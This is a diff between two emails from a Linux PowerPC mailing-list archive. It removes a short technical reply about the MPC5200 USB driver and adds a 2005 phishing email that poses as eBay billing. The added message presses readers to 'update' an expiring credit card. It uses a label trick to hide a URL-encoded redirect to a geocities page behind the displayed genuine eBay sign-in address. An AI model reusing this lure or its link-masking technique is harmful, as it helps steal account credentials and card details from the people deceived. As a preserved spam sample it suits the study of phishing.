@@ -1,20 +1,14 @@
-Return-Path: <dale@farnsworth.org>
-Received: from xyzzy.farnsworth.org (unknown [65.200.49.142])
-	by ozlabs.org (Postfix) with SMTP id 5A18B67EC2
+Return-Path: <bob@aes.mes.org>
+Received: from aes.mes.org (dsl-63-119-168-206.rb0-berk.ospreynet.com
+	[63.119.168.206]) by ozlabs.org (Postfix) with ESMTP id BFC4668020
 	for <linuxppc-embedded@ozlabs.org>;
-	Thu, 11 Aug 2005 09:20:23 +1000 (EST)
-From: "Dale Farnsworth" <dale@farnsworth.org>
-Date: Wed, 10 Aug 2005 16:20:21 -0700
-To: "Thomas S." <thomas@schnuerer-online.de>,
-	linuxppc-embedded list <linuxppc-embedded@ozlabs.org>
-Message-ID: <20050810232021.GA8412@xyzzy.farnsworth.org>
-References: <42F8E0C9.2050505@softadvances.com>
-	<75E0EACF-3C16-45AE-A0D2-CE999AF9AC7B@freescale.com>
-	<42FA5932.4070002@schnuerer-online.de>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-In-Reply-To: <42FA5932.4070002@schnuerer-online.de>
-Subject: Re: [linuxppc] 2.6.12-3 header <asm/usb.h> missing ?
+	Thu, 11 Aug 2005 09:52:09 +1000 (EST)
+To: linuxppc-embedded@ozlabs.org
+From: aw-confirm@ebay.com <aw-confirm@ebay.com>
+Content-Type: text/html
+Message-Id: <20050810233521.12C313B9DF1@aes.mes.org>
+Date: Wed, 10 Aug 2005 19:35:21 -0400 (EDT)
+Subject: Action Required -- Credit/Debit Card Expiration Reminder
 List-Id: Linux on Embedded PowerPC Developers Mail List
 	<linuxppc-embedded.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
@@ -25,20 +19,71 @@ List-Help: <mailto:linuxppc-embedded-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-embedded>,
 	<mailto:linuxppc-embedded-request@ozlabs.org?subject=subscribe>
 
-On Wed, Aug 10, 2005 at 07:44:50PM +0000, Thomas S. wrote:
-> thanks for the Info, that helps. Do you know if in this kernel Version 
-> the MPC5200 USB Bug is already handled?
-> 
-> I refer to errata document MPC5200E.pdf (I think rev. 06/2005) in which 
-> its stated that the frame_no and pad1 words are swapped in the 
-> processors OHCI Area. I saw in some earlier 2.4 kernel that in 
-> /drivers/usb/host/ohci.h the members frame_no and pad1 of struct 
-> ohci_hcca were swapped. maybe thats not necessary anymore ?
-> 
-> Im using this driver to support our embedded system modules equipped 
-> with the 5200 (see the EM1 board on www.men.de for specs).
 
-Yes, the swapped frame_no issue is handled in the 2.6 MPC5200 usb
-driver.
 
--Dale
+<html>
+</head>
+
+<body>
+<table width="95%" height="466" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td height="460" bgcolor="#ffffff"><TABLE cellSpacing=0 cellPadding=0 width=600 border=0>
+        <TBODY>
+          <TR vAlign=top> 
+            <TD width=600 bgColor=#d6dcfe><div align="center"><FONT face="Arial, Helvetica,&#13;&#10;sans-serif   " size=3><STRONG><FONT face=Verdana>Credit/Debit 
+                Card Expiration Reminder</FONT></STRONG></FONT></div></TD>
+            <TD width=200 bgColor=#d6dcfe> <DIV align=right><IMG height=18 src="http://pics.ebaystatic.com/aw/pics/aboutme/v3/ebay_logo_39x18.gif" width=39></DIV></TD>
+          </TR>
+          <TR> 
+            <TD bgColor=#d6dcfe colSpan=2 height=2><IMG height=2 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD>
+          </TR>
+          <TR> 
+            <TD vAlign=center bgColor=#9999cc colSpan=2 height=2><IMG height=2 src="http://pics.ebaystatic.com/aw/pics/x.gif" width=1></TD>
+          </TR>
+        </TBODY>
+      </TABLE>
+      <p align="left"><FONT face="Arial, Helvetica, sans-serif" size=2>Dear <STRONG>eBay</STRONG></FONT> 
+        <FONT face="Arial, Helvetica, sans-serif" size=2>member,<br />
+        This is a courtesy reminder that the following credit/debit card on file 
+        for your eBay account will soon expire: <br />
+        <br />
+        EBay Account ID: E000077978368-840 <br />
+        Card: MSC XXXX-XXXX-XXXX-2245 <br />
+        Expiration Date: 01-JUL-05 <br />
+        Date Reminder Issued: 071705 </FONT><font face="Arial, Helvetica, sans-serif"><br />
+        <font size="2"><br />
+        In order to receive uninterrupted service, please update this information. 
+        <br />
+        <br />
+        To update your credit/debit card information: <br />
+        - Logon with your eBay User ID and Password <br />
+        - Update your credit card information following instructions on the next 
+        page </font></font></p>
+      <a id="spoof" href=http://www.google.com/url?q=%68%74%74%70%3a%2f%2fwww.google.com%2f%75%72%6c%3f%71%3d%68%74%74%70%253a%252f%252Fwww.geocities.com/mibmib4321/>
+<div>
+<a href="http://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ssPageName=h:h:sin:US">
+<table align="left">
+<caption>
+<a href="http://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ssPageName=h:h:sin:US ">
+            <label for="spoof"> <u style="cursor: pointer"> <font color="#0000FF" size="2">http://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ssPageName=h:h:sin:US</font> 
+            </u> </label>
+            <font size="2"></a></font> 
+            </caption>
+</table>
+</a>
+        <p>&nbsp;</p>
+      <p><font size="2">If your account information is not update, your ability 
+        to sell or bid on eBay will become restricted.<br />
+        <strong>Remember:</strong> Your personal information is protected by eBay's 
+        <A title=http://pages.ebay.com/help/community/png-priv.html href="http://pages.ebay.com/help/community/png-priv.html" onfiltered="return openNonHelpWindow(this.href);"><FONT color=#003399>Privacy 
+        Policy</FONT></A>. and encrypted by the industry standard SSL software.</font><br />
+        <br />
+        <font size="2" face="Arial, Helvetica, sans-serif">Thank you for using 
+        eBay. <br />
+        <br />
+        Regards, <br />
+        eBay Billing</font></p> </p></td>
+  </tr>
+</table>
+</body>
+</html>
